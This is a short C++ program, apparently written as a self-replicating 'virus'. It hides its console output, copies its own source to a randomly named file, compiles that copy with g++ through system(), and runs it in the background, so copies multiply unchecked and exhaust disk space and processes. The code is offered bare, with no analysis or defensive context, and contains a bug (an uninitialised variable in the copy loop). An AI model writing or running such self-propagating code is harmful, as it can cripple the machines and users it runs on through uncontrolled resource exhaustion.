#include <iostream>
#include <string>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctime>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

using namespace std;

string gen_random(const int len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string tmp_s;
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return tmp_s;
}

int main()
{


int newfd;

    close(1);
    newfd = open("/dev/null", O_WRONLY);


unsigned seed = time(0);
   
   // Seed the random number generator.
   srand(seed);
reset:
int c;
string name = gen_random(rand()%10 + rand()%3 +1);
string name_c = name + ".cpp";
string doom = name + "&";
cout << name_c <<endl;

if(fopen(name_c.c_str(),"r")){
	//file already exist
	goto reset;
}

FILE *cur_file = fopen(__FILE__,"r");
FILE *new_file = fopen(name_c.c_str(),"a");
while(c != EOF){
        c = getc(cur_file);
        cout << c;
	if(c < 0) {
		putc(32,new_file);
	}

	else{
        putc(c,new_file);
	}
}


fclose(new_file);
fclose(cur_file);

string command = "g++ ";
string command2 = name_c;
string command3 = " -o ";
string command4 = name;
string temp1 = command.append(command2);
string temp2 = temp1.append(command3);
string temp3 = temp2.append(command4);
cout << temp3;
const char *rez = temp3.c_str();
system(rez);
string command5 = "./";
string temp4 = command5.append(doom);
int test = system(temp4.c_str());


return 0;
}



